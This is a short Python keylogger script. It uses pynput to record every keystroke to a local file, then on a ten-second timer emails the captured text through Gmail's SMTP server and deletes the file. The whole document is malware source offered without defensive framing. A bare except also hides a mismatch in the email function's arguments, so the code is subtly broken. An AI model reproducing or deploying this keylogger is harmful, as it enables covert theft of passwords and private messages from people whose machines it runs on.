from pynput.keyboard import Listener, Key
from threading import Timer
import os 
from smtplib import SMTP # email-sending protcol




def key_pressed(key):
    try:
        press = str(key.char)
    except:

        if key == Key.space :
            press = " "
        else:
            press = str(key)
    print("Key is pressed")
    f = open("logs.txt", "a")
    f.write(press)
    f.close()


def timer():
    t = Timer(10, timer)
    t.start()
    try:
        f = open("logs.txt", "r")
        logs = f.read()
        print(logs) # sending the logs file to email then deleting the file
        send_email("email", "email_password", logs)
        os.remove("logs.txt")
    except:
        nothing = ""

def send_email(email, password, to, msg):

    mailer = SMTP('smtp.gmail.com', 587)
    mailer.starttls()
    mailer.login(email, password)
    mailer.sendmail(email, email, msg)
    mailer.quit()

with Listener(on_press=key_pressed) as l:
    timer()
    l.join()
